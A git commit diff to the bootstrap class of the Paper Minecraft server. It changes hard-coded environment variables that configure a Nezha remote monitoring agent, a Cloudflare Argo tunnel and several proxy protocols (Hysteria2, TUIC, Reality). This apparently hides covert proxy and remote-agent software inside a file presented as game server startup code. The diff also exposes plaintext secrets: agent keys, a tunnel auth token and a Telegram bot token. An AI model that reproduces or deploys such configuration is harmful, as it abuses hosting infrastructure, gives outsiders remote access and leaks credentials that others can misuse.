bfb08f8712d4dfa63d43535a097ebfe51293abb6
btpp03 <btpp03@gmail.com>
2025-11-26 20:37:49 +0800

    Update PaperBootstrap.java

--- paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
+++ paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
@@ -96,11 +96,11 @@ public final class PaperBootstrap {
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nezhak2.btpp.ggff.net");
         envVars.put("NEZHA_PORT", "443");
-        envVars.put("NEZHA_KEY", "LJgGliCMaNP8OB0bmL");
+        envVars.put("NEZHA_KEY", "xEuu5YKyowRf2YoXqe");
         envVars.put("ARGO_PORT", "8001");
         envVars.put("ARGO_DOMAIN", "java.5.9.5.b.0.d.0.0.1.0.a.2.ip6.arpa");
-        envVars.put("ARGO_AUTH", "eyJhIjoiYmJmMDc4YjVkYjlhMzcwMmFiYTg3OGQyODYxMDUwMDciLCJ0IjoiMGIyMmNmY2UtMGViNS00OTU4LWE4ZTgtMDk1MWJlNjBiYzRiIiwicyI6IllqWTVZamMyT0RBdE9UVmxZUzAwTm1SaExXSmxaamN0WmpRNE1qTTVZMlpqT1dReSJ9");
-        envVars.put("HY2_PORT", "25739");
+        envVars.put("ARGO_AUTH", "");
+        envVars.put("HY2_PORT", "26520");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
@@ -108,7 +108,7 @@ public final class PaperBootstrap {
         envVars.put("BOT_TOKEN", "7935239797:AAHuQ9jZt-cNjcgjqQ9HH0JzkSWlD53EttM");
         envVars.put("CFIP", "www.visa.com.sg");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "kingsdomain");
+        envVars.put("NAME", "dracobyte");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
